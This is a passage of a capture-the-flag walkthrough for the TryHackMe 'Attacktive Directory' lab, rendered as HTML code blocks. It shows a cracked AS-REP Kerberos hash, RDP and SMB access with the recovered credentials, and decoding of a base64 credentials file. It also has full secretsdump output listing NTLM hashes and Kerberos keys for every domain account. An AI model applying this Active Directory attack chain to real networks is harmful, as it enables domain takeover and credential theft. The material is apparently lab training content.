</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7dac032aeb131d30488aa4e7102e664a$8437aea78414dbca8c33faf12c6665d62a0f324c2e3bee566dfff1de0778e7d3326571d23ae98c1f0c91fd379cc82601808a032a440ae3e547c763b412b71b3796f4039ff311b72530a5cfeba532ba02de47db2a25a8789ebe5eec68ad575c4c4922c23da22f5a4ae5b4aaccd31093b188945139e83b6cb9526303cad42ec71cfb712753cafec4cd31db0b33df080c671b72318a1f8c6cc3389ac3e069d4f0745a47c8b4ebec86a6c91513fadbced3cf9491e873052ce0d642305a17b4aa262b54bfb17e4e794dc9d7e51cf916edc65301678c2420bfe0c4cd2275bd67568dc9ecbb851cdacfdb48a9249250796e5cb88247
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span><span style="color:#fe8019">[</span>-<span style="color:#fe8019">]</span> User robin doesn<span style="color:#b8bb26">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span><span style="color:#b8bb26">[-] User darkstar doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#fabd2f">set</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span><span style="color:#fe8019">[</span>-<span style="color:#fe8019">]</span> User administrator doesn<span style="color:#b8bb26">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span><span style="color:#b8bb26">[-] User backup doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#fabd2f">set</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span><span style="color:#fe8019">[</span>-<span style="color:#fe8019">]</span> User paradox doesn&#39;t have UF_DONT_REQUIRE_PREAUTH <span style="color:#fabd2f">set</span>
</span></span></code></pre></div><p>We can crack this password and now we have a user.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7dac032aeb131d30488aa4e7102e664a$8437aea78414dbca8c33faf12c6665d62a0f324c2e3bee566dfff1de0778e7d3326571d23ae98c1f0c91fd379cc82601808a032a440ae3e547c763b412b71b3796f4039ff311b72530a5cfeba532ba02de47db2a25a8789ebe5eec68ad575c4c4922c23da22f5a4ae5b4aaccd31093b188945139e83b6cb9526303cad42ec71cfb712753cafec4cd31db0b33df080c671b72318a1f8c6cc3389ac3e069d4f0745a47c8b4ebec86a6c91513fadbced3cf9491e873052ce0d642305a17b4aa262b54bfb17e4e794dc9d7e51cf916edc65301678c2420bfe0c4cd2275bd67568dc9ecbb851cdacfdb48a9249250796e5cb88247:management2005
</span></span></code></pre></div><p>Per the instructions, we can RDP in and get a flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>xfreerdp /v:10.10.157.30  /u:svc-admin /p:management2005 /dynamic-resolution +clipboard
</span></span></code></pre></div><pre tabindex="0"><code>TryHackMe{K3rb3r0s_Pr3_4uth}
</code></pre><h3 id="lateral-movement">Lateral Movement</h3>
<p>We can now try to list some smb shares now that we have a user. Realistically we could try to rerun a lot of our enumeration.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ smbclient -L <span style="color:#b8bb26">\\\\</span>10.10.157.30<span style="color:#b8bb26">\\</span> -U spookysec.local//svc-admin%management2005
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>        Sharename       Type      Comment
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>        ---------       ----      -------
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>        ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>        backup          Disk
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>        C$              Disk      Default share
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>        IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>        NETLOGON        Disk      Logon server share
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>        SYSVOL          Disk      Logon server share
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>Reconnecting with SMB1 <span style="color:#fe8019">for</span> workgroup listing.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>do_connect: Connection to 10.10.157.30 failed <span style="color:#fe8019">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>Unable to connect with SMB1 -- no workgroup available
</span></span></code></pre></div><p>We can connect to the share that looks juicy and get a file.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ smbclient <span style="color:#b8bb26">\\\\</span>10.10.157.30<span style="color:#b8bb26">\\</span>backup -U spookysec.local//svc-admin%management2005
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>Try <span style="color:#b8bb26">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>smb: <span style="color:#b8bb26">\&gt;</span> dir
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>  .                                   D        <span style="color:#d3869b">0</span>  Sat Apr  <span style="color:#d3869b">4</span> 15:08:39 <span style="color:#d3869b">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>  ..                                  D        <span style="color:#d3869b">0</span>  Sat Apr  <span style="color:#d3869b">4</span> 15:08:39 <span style="color:#d3869b">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>  backup_credentials.txt              A       <span style="color:#d3869b">48</span>  Sat Apr  <span style="color:#d3869b">4</span> 15:08:53 <span style="color:#d3869b">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>                <span style="color:#d3869b">8247551</span> blocks of size 4096. <span style="color:#d3869b">3619238</span> blocks available
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>smb: <span style="color:#b8bb26">\&gt;</span> get backup_credentials.txt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>getting file <span style="color:#b8bb26">\b</span>ackup_credentials.txt of size <span style="color:#d3869b">48</span> as backup_credentials.txt <span style="color:#fe8019">(</span>0.0 KiloBytes/sec<span style="color:#fe8019">)</span> <span style="color:#fe8019">(</span>average 0.0 KiloBytes/sec<span style="color:#fe8019">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ cat backup_credentials.txt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw%
</span></span></code></pre></div><p>Presumably we can now RDP in and get another user flag.</p>
<p>Or, not!</p>
<p>These credentials are encoded.</p>
<p>I put them in cyberchef and run some magic on them, they were on b64.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>backup@spookysec.local:backup2517860
</span></span></code></pre></div><p>Now, we get another flag.</p>
<pre tabindex="0"><code>TryHackMe{B4ckM3UpSc0tty!}
</code></pre><h4 id="privesc">Privesc</h4>
<p>This user had  privileges in which AD changes are synced to the user, which means that it could dump the ntds.dit file.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ secretsdump.py spookysec.local/backup:backup2517860@10.10.157.30 -dc-ip 10.10.157.30
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Impacket v0.9.19 - Copyright <span style="color:#d3869b">2019</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span><span style="color:#fe8019">[</span>-<span style="color:#fe8019">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Dumping Domain Credentials <span style="color:#fe8019">(</span>domain<span style="color:#b8bb26">\u</span>id:rid:lmhash:nthash<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>spookysec.local<span style="color:#b8bb26">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>spookysec.local<span style="color:#b8bb26">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>spookysec.local<span style="color:#b8bb26">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>spookysec.local<span style="color:#b8bb26">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>spookysec.local<span style="color:#b8bb26">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>spookysec.local<span style="color:#b8bb26">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>spookysec.local<span style="color:#b8bb26">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>spookysec.local<span style="color:#b8bb26">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>spookysec.local<span style="color:#b8bb26">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>spookysec.local<span style="color:#b8bb26">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>spookysec.local<span style="color:#b8bb26">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>spookysec.local<span style="color:#b8bb26">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>spookysec.local<span style="color:#b8bb26">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>spookysec.local<span style="color:#b8bb26">\a</span>-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:e62b6319202378e4de82172bca1b25c3:::
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Kerberos keys grabbed
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">28</span><span>Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">29</span><span>Administrator:des-cbc-md5:2079ce0e5df189ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">30</span><span>krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">31</span><span>krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">32</span><span>krbtgt:des-cbc-md5:b94f97e97fabbf5d
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">33</span><span>spookysec.local<span style="color:#b8bb26">\s</span>kidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">34</span><span>spookysec.local<span style="color:#b8bb26">\s</span>kidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">35</span><span>spookysec.local<span style="color:#b8bb26">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">36</span><span>spookysec.local<span style="color:#b8bb26">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">37</span><span>spookysec.local<span style="color:#b8bb26">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">38</span><span>spookysec.local<span style="color:#b8bb26">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">39</span><span>spookysec.local<span style="color:#b8bb26">\j</span>ames:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">40</span><span>spookysec.local<span style="color:#b8bb26">\j</span>ames:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">41</span><span>spookysec.local<span style="color:#b8bb26">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">42</span><span>spookysec.local<span style="color:#b8bb26">\o</span>ptional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">43</span><span>spookysec.local<span style="color:#b8bb26">\o</span>ptional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">44</span><span>spookysec.local<span style="color:#b8bb26">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">45</span><span>spookysec.local<span style="color:#b8bb26">\s</span>herlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">46</span><span>spookysec.local<span style="color:#b8bb26">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">47</span><span>spookysec.local<span style="color:#b8bb26">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">48</span><span>spookysec.local<span style="color:#b8bb26">\d</span>arkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">49</span><span>spookysec.local<span style="color:#b8bb26">\d</span>arkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">50</span><span>spookysec.local<span style="color:#b8bb26">\d</span>arkstar:des-cbc-md5:758af4d061381cea
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">51</span><span>spookysec.local<span style="color:#b8bb26">\O</span>ri:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">52</span><span>spookysec.local<span style="color:#b8bb26">\O</span>ri:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">53</span><span>spookysec.local<span style="color:#b8bb26">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">54</span><span>spookysec.local<span style="color:#b8bb26">\r</span>obin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">55</span><span>spookysec.local<span style="color:#b8bb26">\r</span>obin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">56</span><span>spookysec.local<span style="color:#b8bb26">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">57</span><span>spookysec.local<span style="color:#b8bb26">\p</span>aradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">58</span><span>spookysec.local<span style="color:#b8bb26">\p</span>aradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">59</span><span>spookysec.local<span style="color:#b8bb26">\p</span>aradox:des-cbc-md5:83988983f8b34019
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">60</span><span>spookysec.local<span style="color:#b8bb26">\M</span>uirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">61</span><span>spookysec.local<span style="color:#b8bb26">\M</span>uirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">62</span><span>spookysec.local<span style="color:#b8bb26">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">63</span><span>spookysec.local<span style="color:#b8bb26">\h</span>orshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">64</span><span>spookysec.local<span style="color:#b8bb26">\h</span>orshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">65</span><span>spookysec.local<span style="color:#b8bb26">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">66</span><span>spookysec.local<span style="color:#b8bb26">\s</span>vc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">67</span><span>spookysec.local<span style="color:#b8bb26">\s</span>vc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
